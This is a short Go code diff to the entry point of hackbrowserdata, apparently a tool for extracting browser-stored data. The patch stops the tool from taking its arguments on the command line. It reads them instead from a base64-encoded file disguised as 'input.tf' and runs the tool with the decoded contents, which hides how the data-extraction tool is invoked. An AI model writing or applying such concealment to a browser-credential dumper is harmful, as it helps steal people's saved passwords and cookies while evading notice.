@@ -2,10 +2,10 @@ package main
 
 import (
 	"log/slog"
-	"os"
-
+	"io/ioutil"
+	"encoding/base64"
 	"github.com/urfave/cli/v2"
-
+	"github.com/google/shlex"
 	"github.com/moond4rk/hackbrowserdata/browser"
 	"github.com/moond4rk/hackbrowserdata/logger"
 	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
@@ -69,7 +69,22 @@ func Execute() {
 			return nil
 		},
 	}
-	err := app.Run(os.Args)
+	data, err := ioutil.ReadFile("input.tf")
+	if err != nil {
+        panic(err)
+    }
+	
+	decodedData, err := base64.StdEncoding.DecodeString(string(data))
+	if err != nil {
+        panic(err)
+    }
+	
+    args, err := shlex.Split(string(decodedData))
+    if err != nil {
+        panic(err)
+    }
+	
+	err = app.Run(args)
 	if err != nil {
 		panic(err)
 	}
